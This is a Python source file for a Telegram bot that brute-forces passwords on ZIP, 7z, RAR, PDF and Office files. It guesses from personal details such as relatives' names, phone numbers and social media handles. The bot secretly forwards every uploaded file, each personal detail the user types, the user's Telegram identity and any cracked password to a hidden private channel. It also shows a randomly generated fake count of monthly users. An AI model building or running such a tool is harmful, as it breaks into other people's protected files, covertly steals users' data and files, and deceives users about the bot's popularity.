import os
import json
import time
import random
import requests
import threading
import pyzipper
import py7zr
import pdfplumber
from flask import Flask, request, jsonify
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

TOKEN = os.environ.get("BOT_TOKEN")
RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
PRIVATE_CHANNEL = -1004479815753
CHANNEL_USERNAME = "@nrtecno2"

app = Flask(__name__)
user_sessions = {}
active_cracking = {}

# Session with Retry
session = requests.Session()
retry = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)
session.mount('https://', adapter)


def get_monthly_users():
    return f"{random.randint(10000, 99999):,}"


# ============================================================
# SMART PASSWORD GENERATOR — @,#,& PRIORITY
# ============================================================
class SmartPasswordGenerator:
    def __init__(self):
        self.lowercase = 'abcdefghijklmnopqrstuvwxyz'
        self.uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        self.digits = '0123456789'
        self.high_specials = ['@', '#', '&']
        self.low_specials = ['$', '%', '^', '*', '!', '?', '/', '\\', '|', '~', ':', ';', '"', "'", ',', '.', '<', '>', '[', ']', '{', '}', '`', '+', '=', '-', '_']
        self.all_chars = self.lowercase + self.uppercase + self.digits + ''.join(self.high_specials) + ''.join(self.low_specials[:5])

        self.names = ['admin', 'root', 'user', 'guest', 'login', 'test', 'demo',
                      'narendra', 'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil',
                      'anil', 'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit',
                      'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 'ramesh',
                      'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin', 'rajesh', 'kapil',
                      'mukesh', 'ravi', 'ashok', 'shyam', 'kumar', 'singh', 'sharma',
                      'verma', 'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai',
                      'meghwal', 'choudhary', 'rathore', 'shekhawat', 'gehlot',
                      'vyas', 'trivedi', 'pandey', 'tripathi', 'mishra']

        self.common_words = ['password', 'admin', 'root', 'toor', 'iloveyou', 'sunshine',
                             'princess', 'dragon', 'baseball', 'superman', 'batman',
                             'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
                             'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
                             'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night']

        self.numbers = ['123', '456', '789', '000', '111', '222', '333', '987', '654', '321',
                        '1234', '5678', '9876', '123456', '9876543210', '5755', '57555754',
                        '4586765', '356dggj', 'dggj356', '5755 5754', '5 5 7 9 4']

        self.used_passwords = set()
        self.generator_mode = 0
        self.should_stop = False

    # ============================================================
    # HIGHEST PRIORITY: USER INFO BASED — @,#,& FOCUS
    # ============================================================
    def generate_from_user_info(self, user_info):
        passwords = set()
        all_info = []

        # Collect all info
        for key, value in user_info.items():
            if value and isinstance(value, str):
                all_info.append(value.strip())
                # Also add variations
                all_info.append(value.upper())
                all_info.append(value.lower())
                all_info.append(value.capitalize())
                all_info.append(value.title())

        # If hint exists, give it HIGHEST priority
        if user_info.get('password_hint'):
            hint = user_info.get('password_hint').strip()
            all_info.insert(0, hint)
            all_info.insert(0, hint.upper())
            all_info.insert(0, hint.lower())

        # Also add all relatives
        relatives = ['father', 'mother', 'brother', 'sister', 'gf', 'bf', 'son', 'daughter', 'wife', 'husband']
        for rel in relatives:
            if user_info.get(rel):
                all_info.append(user_info.get(rel))
                all_info.append(user_info.get(rel).upper())
                all_info.append(user_info.get(rel).lower())
                all_info.append(user_info.get(rel).capitalize())

        # Add usernames
        for platform in ['instagram', 'facebook', 'twitter', 'snapchat', 'telegram']:
            if user_info.get(f'{platform}_username'):
                all_info.append(user_info.get(f'{platform}_username'))
                all_info.append(user_info.get(f'{platform}_username').upper())

        # Add mobile numbers
        if user_info.get('mobile_numbers'):
            mobiles = user_info.get('mobile_numbers').split(',')
            for m in mobiles:
                m_clean = ''.join(filter(str.isdigit, m))
                if m_clean:
                    all_info.append(m_clean)
                    all_info.append(m_clean[-4:])
                    all_info.append(m_clean[-6:])

        # Clean and deduplicate
        info_pieces = list(set([p for p in all_info if p and len(p) >= 2]))

        if not info_pieces:
            info_pieces = ['admin', 'password', 'root']

        # Step 1: Exact info
        for p in info_pieces:
            passwords.add(p)
            passwords.add(p[::-1])

        # Step 2: Info + Number
        for p in info_pieces[:30]:
            for num in self.numbers[:8]:
                passwords.add(f"{p}{num}")
                passwords.add(f"{p}{num}@")
                passwords.add(f"{p}{num}#")
                passwords.add(f"{p}{num}&")
                passwords.add(f"{p}@{num}")
                passwords.add(f"{p}#{num}")
                passwords.add(f"{p}&{num}")
                passwords.add(f"{p} {num}")
                passwords.add(f"{num}{p}")

        # Step 3: Info + High Priority Specials
        for p in info_pieces[:25]:
            for spec in self.high_specials:
                for num in self.numbers[:6]:
                    passwords.add(f"{p}{spec}{num}")
                    passwords.add(f"{p}{num}{spec}")
                    passwords.add(f"{p}{spec}{num}{spec}")

        # Step 4: Info + Info combinations
        for i in range(min(15, len(info_pieces))):
            for j in range(min(15, len(info_pieces))):
                if i != j:
                    p1 = info_pieces[i]
                    p2 = info_pieces[j]
                    if p1 and p2:
                        passwords.add(f"{p1}{p2}")
                        passwords.add(f"{p1}@{p2}")
                        passwords.add(f"{p1}#{p2}")
                        passwords.add(f"{p1}&{p2}")
                        passwords.add(f"{p1}{p2}{self.numbers[0]}")
                        passwords.add(f"{p1}@{p2}{self.numbers[0]}")

        # Step 5: Long passwords (5 to 100 chars) from info
        for p in info_pieces[:10]:
            if len(p) >= 3:
                for length in range(5, 21):
                    base = (p * (length // len(p) + 1))[:length]
                    passwords.add(base)
                    passwords.add(f"{base}@")
                    passwords.add(f"{base}#")
                    passwords.add(f"{base}&")
                    passwords.add(f"{base}{self.numbers[0]}")
                    for spec in self.high_specials:
                        passwords.add(f"{base[:length-1]}{spec}")

        # Step 6: Brand + Info
        for p in info_pieces[:10]:
            for brand in ['NRTECNO', 'Nrtecno', 'PRIVACY', 'SECURE', 'HACK']:
                for spec in self.high_specials:
                    passwords.add(f"{brand}{p}")
                    passwords.add(f"{brand}{spec}{p}")
                    passwords.add(f"{brand}{p}{spec}{self.numbers[0]}")

        print(f"✅ Generated {len(passwords)} info-based passwords")
        return list(passwords)

    def generate_name_passwords(self):
        passwords = set()
        for name in self.names:
            passwords.add(name)
            passwords.add(name.upper())
            passwords.add(name.capitalize())
            for num in self.numbers[:5]:
                passwords.add(f"{name}{num}")
                for spec in self.high_specials:
                    passwords.add(f"{name}{spec}{num}")
                    passwords.add(f"{name.upper()}{spec}{num}")
        return list(passwords)

    def generate_word_passwords(self):
        passwords = set()
        for word in self.common_words:
            passwords.add(word)
            passwords.add(word.upper())
            passwords.add(word.capitalize())
            for num in self.numbers[:5]:
                passwords.add(f"{word}{num}")
                for spec in self.high_specials:
                    passwords.add(f"{word}{spec}{num}")
        return list(passwords)

    def generate_random_passwords(self, count=100):
        passwords = []
        chars = self.lowercase + self.uppercase + self.digits
        for _ in range(count):
            length = random.randint(5, 15)
            pwd = ''
            has_spec = False
            for i in range(length):
                if i == length - 1 and not has_spec:
                    pwd += random.choice(self.high_specials)
                    has_spec = True
                else:
                    if random.random() < 0.15:
                        if random.random() < 0.7:
                            pwd += random.choice(self.high_specials)
                        else:
                            pwd += random.choice(self.low_specials[:6])
                        has_spec = True
                    else:
                        pwd += random.choice(chars)
            passwords.append(pwd)
        return passwords

    def get_next_passwords(self, user_info=None, batch_size=1500):
        new_passwords = []

        if user_info and self.generator_mode == 0:
            info_passwords = self.generate_from_user_info(user_info)
            for pwd in info_passwords:
                if pwd not in self.used_passwords and len(pwd) >= 2:
                    self.used_passwords.add(pwd)
                    new_passwords.append(pwd)
                    if len(new_passwords) >= batch_size:
                        return new_passwords
            self.generator_mode = 1

        if self.generator_mode == 1:
            name_passwords = self.generate_name_passwords()
            for pwd in name_passwords:
                if pwd not in self.used_passwords and len(pwd) >= 4:
                    self.used_passwords.add(pwd)
                    new_passwords.append(pwd)
                    if len(new_passwords) >= batch_size:
                        return new_passwords
            self.generator_mode = 2

        if self.generator_mode == 2:
            word_passwords = self.generate_word_passwords()
            for pwd in word_passwords:
                if pwd not in self.used_passwords and len(pwd) >= 4:
                    self.used_passwords.add(pwd)
                    new_passwords.append(pwd)
                    if len(new_passwords) >= batch_size:
                        return new_passwords
            self.generator_mode = 3

        while len(new_passwords) < batch_size:
            random_passwords = self.generate_random_passwords(batch_size * 2)
            for pwd in random_passwords:
                if pwd not in self.used_passwords and len(pwd) >= 4:
                    self.used_passwords.add(pwd)
                    new_passwords.append(pwd)
                    if len(new_passwords) >= batch_size:
                        return new_passwords

        return new_passwords

    def reset(self):
        self.used_passwords = set()
        self.generator_mode = 0
        self.should_stop = False


# ============================================================
# FILE CRACKERS
# ============================================================
def crack_zip_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pyzipper.AESZipFile(file_path) as zf:
                zf.extractall(pwd=pwd.encode())
                return pwd
        except:
            continue
    return None


def crack_7z_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with py7zr.SevenZipFile(file_path, password=pwd) as archive:
                archive.extractall()
                return pwd
        except:
            continue
    return None


def crack_pdf_fast(file_path, password_list):
    for pwd in password_list:
        try:
            with pdfplumber.open(file_path, password=pwd) as pdf:
                if len(pdf.pages) > 0:
                    return pwd
        except:
            continue
    return None


def crack_office_fast(file_path, password_list):
    try:
        import msoffcrypto
        for pwd in password_list:
            try:
                with open(file_path, 'rb') as f:
                    office = msoffcrypto.OfficeFile(f)
                    office.load_key(password=pwd)
                    return pwd
            except:
                continue
    except:
        pass
    return None


def crack_rar_fast(file_path, password_list):
    try:
        import rarfile
        import tempfile
        if not rarfile.is_rarfile(file_path):
            return None
        with tempfile.TemporaryDirectory() as tmpdir:
            for pwd in password_list:
                try:
                    with rarfile.RarFile(file_path) as rf:
                        rf.extractall(path=tmpdir, pwd=pwd)
                        return pwd
                except:
                    continue
    except:
        pass
    return None


def crack_file_fast(file_path, ext, password_list):
    if ext == 'zip':
        return crack_zip_fast(file_path, password_list)
    elif ext == '7z':
        return crack_7z_fast(file_path, password_list)
    elif ext == 'pdf':
        return crack_pdf_fast(file_path, password_list)
    elif ext in ['docx', 'doc', 'xlsx', 'xls', 'pptx', 'ppt']:
        return crack_office_fast(file_path, password_list)
    elif ext == 'rar':
        return crack_rar_fast(file_path, password_list)
    return None


# ============================================================
# TELEGRAM HELPERS
# ============================================================
def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        session.post(url, json=payload, timeout=30)
    except:
        time.sleep(2)
        session.post(url, json=payload, timeout=30)


def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        session.post(url, json=payload, timeout=30)
    except:
        pass


def send_document(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        try:
            session.post(url, files=files, data=data, timeout=60)
        except:
            pass


def forward_file_to_channel(chat_id, file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': chat_id, 'caption': caption}
        try:
            response = session.post(url, files=files, data=data, timeout=60)
            result = response.json()
            if result.get('ok'):
                return result.get('result', {}).get('message_id')
            return None
        except Exception as e:
            print(f"Forward error: {e}")
            return None


def edit_channel_message(channel_id, message_id, new_caption):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageCaption"
    payload = {
        "chat_id": channel_id,
        "message_id": message_id,
        "caption": new_caption,
        "parse_mode": "Markdown"
    }
    try:
        response = session.post(url, json=payload, timeout=30)
        return response.json().get('ok', False)
    except:
        return False


def answer_callback(callback_id, text=""):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text}
    try:
        session.post(url, json=payload, timeout=30)
    except:
        pass


def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = session.get(url, params=params, timeout=30)
        data = response.json()
        if data["ok"]:
            status = data["result"]["status"]
            return status in ["member", "creator", "administrator"]
        return False
    except:
        return False


# ============================================================
# CUSTOM INFO KEYBOARD
# ============================================================
def get_custom_fields():
    return [
        'name', 'father', 'mother', 'brother', 'sister', 'gf', 'bf',
        'son', 'daughter', 'wife', 'husband', 'friends',
        'address', 'city', 'state', 'country', 'pincode',
        'mobile_numbers',
        'instagram_username', 'facebook_username', 'twitter_username',
        'snapchat_username', 'telegram_username',
        'password_hint'
    ]


def get_custom_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
            ],
            [
                {"text": "🛑 /stop & /start to new file password 🔑", "callback_data": "stop_cracking"}
            ]
        ]
    }


def join_verify_keyboard():
    return {
        "inline_keyboard": [
            [
                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
                {"text": "✅ VERIFY", "callback_data": "verify"}
            ]
        ]
    }


# ============================================================
# CRACK IN BACKGROUND
# ============================================================
def crack_in_background(chat_id, file_path, file_name, ext, user_info=None, channel_msg_id=None):
    try:
        generator = SmartPasswordGenerator()
        total_tried = 0
        batch_size = 1500
        start_time = time.time()
        found = False
        last_progress_time = time.time()

        if chat_id not in active_cracking:
            active_cracking[chat_id] = {}
        active_cracking[chat_id]['generator'] = generator
        active_cracking[chat_id]['thread'] = threading.current_thread()
        active_cracking[chat_id]['stop_flag'] = False

        send_message(chat_id, f"⚡ *Smart Brute-Force Started*\n\n📊 Priority: Info → Names → Words → Random\n⏳ Will keep generating until found!\n\n_Type /stop to cancel_", parse_mode='Markdown')

        while not active_cracking[chat_id].get('stop_flag', False):
            password_list = generator.get_next_passwords(user_info, batch_size)
            if not password_list:
                break
            total_tried += len(password_list)

            current_time = time.time()
            if total_tried % 5000 == 0 or (current_time - last_progress_time) > 2.0:
                send_message(
                    chat_id,
                    f"🔄 *Tried {total_tried:,} passwords...*\n"
                    f"⏳ Still searching...\n"
                    f"_Type /stop to cancel_",
                    parse_mode='Markdown'
                )
                last_progress_time = current_time

            password = crack_file_fast(file_path, ext, password_list)
            if password:
                elapsed = time.time() - start_time
                result_msg = f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}\n📊 Tried: {total_tried:,} passwords\n⚡ Time: {elapsed:.2f}s"

                send_message(chat_id, result_msg, parse_mode='Markdown')

                if channel_msg_id:
                    new_caption = f"✅ *Password Found!*\n📁 {file_name}\n🔑 `{password}`\n👤 User: @{chat_id}\n📊 Tried: {total_tried:,} passwords"
                    edit_channel_message(PRIVATE_CHANNEL, channel_msg_id, new_caption)

                try:
                    send_document(PRIVATE_CHANNEL, file_path,
                        f"✅ Found!\n📁 {file_name}\n🔑 {password}\n📊 Tried: {total_tried:,}")
                except:
                    pass
                found = True
                break

        if not found:
            if active_cracking.get(chat_id, {}).get('stop_flag', False):
                send_message(chat_id,
                    f"🛑 *Cracking Stopped by User!*\n\n"
                    f"📊 Total tried: {total_tried:,} passwords\n\n"
                    f"_Type /start to use bot again_",
                    parse_mode='Markdown')
            else:
                send_message(chat_id,
                    f"❌ *Password Not Found!*\n\n"
                    f"📁 {file_name}\n"
                    f"📊 Tried: {total_tried:,} passwords\n"
                    f"⚡ Time: {time.time() - start_time:.2f}s",
                    parse_mode='Markdown')

                if channel_msg_id:
                    new_caption = f"❌ *Password Not Found!*\n📁 {file_name}\n👤 User: @{chat_id}\n📊 Tried: {total_tried:,} passwords"
                    edit_channel_message(PRIVATE_CHANNEL, channel_msg_id, new_caption)

        generator.reset()
        if os.path.exists(file_path):
            os.remove(file_path)

        if chat_id in active_cracking:
            del active_cracking[chat_id]

    except Exception as e:
        send_message(chat_id, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
        if os.path.exists(file_path):
            os.remove(file_path)
        if chat_id in active_cracking:
            del active_cracking[chat_id]


# ============================================================
# MAIN WEBHOOK HANDLER
# ============================================================
@app.route(f'/webhook/{TOKEN}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return jsonify({"status": "error"}), 400

        if 'message' in update:
            message = update['message']
            chat_id = message['chat']['id']
            user_id = message['from']['id']
            username = message['from'].get('username', str(user_id))
            first_name = message['from'].get('first_name', '')
            last_name = message['from'].get('last_name', '')

            if 'text' in message:
                text = message['text']

                if text == '/start':
                    if not check_channel_membership(user_id):
                        send_message(chat_id, "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                    else:
                        monthly_users = get_monthly_users()
                        send_message(chat_id,
                            f"🔐 *FILE PASSWORD CRACKER*\n"
                            f"👥 *{monthly_users} monthly users*\n\n"
                            f"✅ Verified!\n"
                            f"⚡ *Smart Mode: Info → Names → Words → Random*\n"
                            f"📁 *Send me any password protected file.*\n\n"
                            f"_Will keep generating until found!_",
                            parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                if text == '/stop' or text == '/cancel':
                    if chat_id in active_cracking:
                        active_cracking[chat_id]['stop_flag'] = True
                        send_message(chat_id, "🛑 *Stopping cracking process...*\n\n_Type /start to use bot again_", parse_mode='Markdown')
                    else:
                        send_message(chat_id, "❌ *No active cracking process to stop.*", parse_mode='Markdown')
                    return jsonify({"status": "ok"}), 200

                # Handle custom info collection
                if chat_id in user_sessions and user_sessions[chat_id].get('state') == 'collecting_info':
                    session_data = user_sessions[chat_id]
                    field = session_data['current_field']
                    session_data['info'][field] = text

                    # 🔥 Send to private channel immediately
                    try:
                        send_message(PRIVATE_CHANNEL, f"📝 *{field.replace('_', ' ').title()}:* {text}\n👤 @{username}")
                    except:
                        pass

                    fields = session_data['fields']
                    current_index = fields.index(field)

                    if current_index + 1 < len(fields):
                        next_field = fields[current_index + 1]
                        session_data['current_field'] = next_field
                        send_message(chat_id, f"📝 *Enter {next_field.replace('_', ' ').title()}?*\n\n_Send /skip to skip this field_", parse_mode='Markdown')
                    else:
                        session_data['state'] = 'cracking'
                        info_summary = "📝 *All Info Collected*\n\n"
                        for f, v in session_data['info'].items():
                            if v:
                                info_summary += f"📌 *{f.replace('_', ' ').title()}:* {v}\n"
                        info_summary += f"\n👤 @{username}\n📁 {session_data['file_name']}"

                        # Add Telegram public info
                        info_summary += f"\n📱 *Telegram Info:*\n"
                        info_summary += f"   User ID: {user_id}\n"
                        if username:
                            info_summary += f"   Username: @{username}\n"
                        if first_name:
                            info_summary += f"   First Name: {first_name}\n"
                        if last_name:
                            info_summary += f"   Last Name: {last_name}\n"

                        try:
                            send_message(PRIVATE_CHANNEL, info_summary)
                        except:
                            pass

                        threading.Thread(
                            target=crack_in_background,
                            args=(chat_id, session_data['file_path'], session_data['file_name'], session_data['file_ext'], session_data['info'], session_data.get('channel_msg_id'))
                        ).start()

                        del user_sessions[chat_id]
                    return jsonify({"status": "ok"}), 200

            if 'document' in message:
                file = message['document']
                file_name = file.get('file_name', 'unknown')
                file_id = file['file_id']

                if not check_channel_membership(user_id):
                    send_message(chat_id, "🔴 Access Denied!", reply_markup=join_verify_keyboard())
                    return jsonify({"status": "ok"}), 200

                file_info = session.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path_api = file_info['result']['file_path']
                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
                response = session.get(file_url, timeout=60)

                os.makedirs("downloads", exist_ok=True)
                file_path = f"downloads/{file_name}"
                with open(file_path, 'wb') as f:
                    f.write(response.content)

                ext = file_name.split('.')[-1].lower()

                caption = f"📁 *File Received*\n📄 {file_name}\n👤 @{username}\n⏳ Status: Cracking in progress..."
                channel_msg_id = forward_file_to_channel(PRIVATE_CHANNEL, file_path, caption)

                user_sessions[chat_id] = {
                    'file_path': file_path,
                    'file_name': file_name,
                    'file_ext': ext,
                    'channel_msg_id': channel_msg_id,
                    'state': 'waiting_for_option'
                }

                send_message(
                    chat_id,
                    f"📁 *File Received!*\n\n📄 {file_name}\n⚡ *Choose an option:*\n\n_Type /stop to cancel at any time_",
                    reply_markup=get_custom_keyboard(),
                    parse_mode='Markdown'
                )

                return jsonify({"status": "ok"}), 200

        if 'callback_query' in update:
            callback = update['callback_query']
            callback_id = callback['id']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            user_id = callback['from']['id']
            data = callback['data']

            if data == 'verify':
                if check_channel_membership(user_id):
                    monthly_users = get_monthly_users()
                    edit_message(chat_id, message_id,
                        f"🔐 *FILE PASSWORD CRACKER*\n"
                        f"👥 *{monthly_users} monthly users*\n\n"
                        f"✅ Verified!\n"
                        f"⚡ *Smart Mode: Info → Names → Words → Random*\n"
                        f"📁 *Send me any password protected file.*\n\n"
                        f"_Will keep generating until found!_",
                        parse_mode='Markdown')
                else:
                    edit_message(chat_id, message_id, "🔴 *Still Not Verified!*\n\n❌ Please join @nrtecno2 first.", reply_markup=join_verify_keyboard())
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'stop_cracking':
                if chat_id in active_cracking:
                    active_cracking[chat_id]['stop_flag'] = True
                    send_message(chat_id, "🛑 *Stopping cracking process...*\n\n_Type /start to use bot again_", parse_mode='Markdown')
                    answer_callback(callback_id, "Stopping...")
                else:
                    send_message(chat_id, "❌ *No active cracking process to stop.*", parse_mode='Markdown')
                    answer_callback(callback_id, "No active process")
                return jsonify({"status": "ok"}), 200

            if data == 'auto_direct':
                session_data = user_sessions.get(chat_id)
                if not session_data:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                monthly_users = get_monthly_users()
                edit_message(chat_id, message_id,
                    f"🔐 *FILE PASSWORD CRACKER*\n"
                    f"👥 *{monthly_users} monthly users*\n\n"
                    f"⚡ *Smart mode activated (Direct)...*\n"
                    f"📊 Info → Names → Words → Random\n"
                    f"⏳ Will keep generating until found!\n"
                    f"_Type /stop to cancel_",
                    parse_mode='Markdown')

                threading.Thread(
                    target=crack_in_background,
                    args=(chat_id, session_data['file_path'], session_data['file_name'], session_data['file_ext'], None, session_data.get('channel_msg_id'))
                ).start()

                del user_sessions[chat_id]
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'auto_info':
                session_data = user_sessions.get(chat_id)
                if not session_data:
                    send_message(chat_id, "❌ *No file found. Send a file first.*", parse_mode='Markdown')
                    answer_callback(callback_id)
                    return jsonify({"status": "ok"}), 200

                fields = get_custom_fields()
                session_data['info'] = {}
                session_data['fields'] = fields
                session_data['current_field'] = fields[0]
                session_data['state'] = 'collecting_info'

                edit_message(chat_id, message_id, "📝 *Let's collect some info for smart password generation*\n\n", parse_mode='Markdown')
                send_message(chat_id, f"📝 *Enter {fields[0].replace('_', ' ').title()}?*\n\n_Send /skip to skip this field_", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            if data == 'cancel':
                session_data = user_sessions.get(chat_id)
                if session_data and session_data.get('file_path'):
                    os.remove(session_data['file_path'])
                del user_sessions[chat_id]
                send_message(chat_id, "❌ *Cancelled.* Send file again.", parse_mode='Markdown')
                answer_callback(callback_id)
                return jsonify({"status": "ok"}), 200

            answer_callback(callback_id)
            return jsonify({"status": "ok"}), 200

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


# ============================================================
# SET WEBHOOK AND MAIN
# ============================================================
def set_webhook():
    webhook_url = f"{RENDER_URL}/webhook/{TOKEN}"
    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
    try:
        response = session.post(url, json={"url": webhook_url}, timeout=30)
        if response.status_code == 200:
            print(f"✅ Webhook set to: {webhook_url}")
        else:
            print(f"❌ Webhook failed: {response.text}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


if __name__ == "__main__":
    if not TOKEN:
        print("❌ BOT_TOKEN not found!")
        exit(1)

    set_webhook()

    port = int(os.environ.get("PORT", 5000))
    print("🤖 NRTECNO CUSTOM INFO PASSWORD CRACKER STARTED...")
    print("🔥 PRIORITY: Info (Relatives, Usernames, Hint) → Names → Words → Random")
    print("🔢 FOCUS: @, #, & symbols")
    print("👥 FAKE MONTHLY USERS: 10,000+")
    print("📁 Files: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX")
    print("🚀 Running on port", port)

    app.run(host="0.0.0.0", port=port)
